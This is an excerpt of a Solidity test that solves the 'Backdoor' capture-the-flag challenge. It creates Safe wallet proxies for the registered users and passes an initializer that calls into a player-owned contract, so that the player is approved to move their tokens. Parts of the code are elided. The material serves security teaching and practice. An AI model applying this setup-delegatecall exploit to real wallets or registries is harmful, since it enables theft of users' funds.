...
contract BackdoorChallenge is Test {
    ...
    function test_backdoor() public checkSolvedByPlayer {
        ...
        address to = address(myWallet);
        bytes memory data = abi.encodeWithSelector(myWallet.makeApproval.selector, token, player);
        address fallbackHandler = address(0);
        address paymentToken;
        uint256 payment = 0;
        address payable paymentReceiver = payable(player);

        for (uint256 i = 0; i < users.length; i++) {
            _owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector, _owners, _threshold, to, data, fallbackHandler, payment, payment, paymentReceiver
            );
            SafeProxy proxy =
...
contract MyWallet is Safe {
    function makeApproval(DamnValuableToken token, address spender) external {
